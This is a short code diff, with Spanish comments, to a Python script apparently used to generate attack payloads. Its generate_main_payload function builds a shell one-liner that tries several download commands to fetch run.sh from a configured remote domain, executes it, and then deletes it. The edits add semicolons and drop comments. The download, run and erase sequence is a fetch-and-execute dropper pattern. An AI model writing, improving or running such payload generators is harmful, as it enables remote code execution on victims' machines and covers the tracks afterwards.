@@ -31,16 +31,16 @@ DOWNLOAD_SCRIPT_METHODS = [
 
 def generate_main_payload():
     """Genera el one‑liner que descarga run.sh con múltiples métodos y lo ejecuta."""
-    # Construir bloque if/elif
     parts = []
     for i, (cmd, tmpl) in enumerate(DOWNLOAD_SCRIPT_METHODS):
         if i == 0:
             parts.append(f"if command -v {cmd} >/dev/null 2>&1; then")
         else:
             parts.append(f"elif command -v {cmd} >/dev/null 2>&1; then")
-        parts.append(f"    {tmpl.format(domain=DOMAIN, script=SCRIPT_NAME)}")
+        # Add a semicolon after the command
+        parts.append(f"    {tmpl.format(domain=DOMAIN, script=SCRIPT_NAME)};")
     parts.append("else")
-    parts.append("    exit 1")
+    parts.append("    exit 1;")
     parts.append("fi")
 
     download_script = " ".join(parts)
@@ -52,7 +52,7 @@ def generate_main_payload():
         f"./{SCRIPT_NAME}; "
         f"rm -f {SCRIPT_NAME}"
     )
-    payload = ' '.join(payload.split())  # normalizar espacios
+    payload = ' '.join(payload.split())
     return payload
 
 def generate_run_script():
